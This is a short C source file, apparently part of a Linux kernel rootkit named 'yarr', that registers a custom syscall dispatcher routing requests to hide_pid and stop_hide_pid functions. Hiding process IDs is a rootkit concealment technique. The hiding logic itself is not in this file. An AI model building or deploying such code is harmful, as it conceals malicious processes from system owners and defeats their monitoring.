#include "yarrcall.h"
#include "log.h"
#include "hidepid.h"

asmlinkage long entry_yarrcall(struct pt_regs *regs) {
    return yarrcall((int)(regs->di), (void *)(regs->si));
}

long yarrcall(int svc, YarrCallArgs_t __user *args) {
    int err;

    yarr_log("Requested service %d", svc);
    switch (svc) {
        case HIDE_PID:
            err = hide_pid(args->hidepid_args.pid);
            break;

        case STOP_HIDE_PID:
            err = stop_hide_pid(args->hidepid_args.pid);
            break;

        default:
            yarr_log("Yarrcall requested %d not recognized", svc);
            err = -1;
    }

    return err;
}


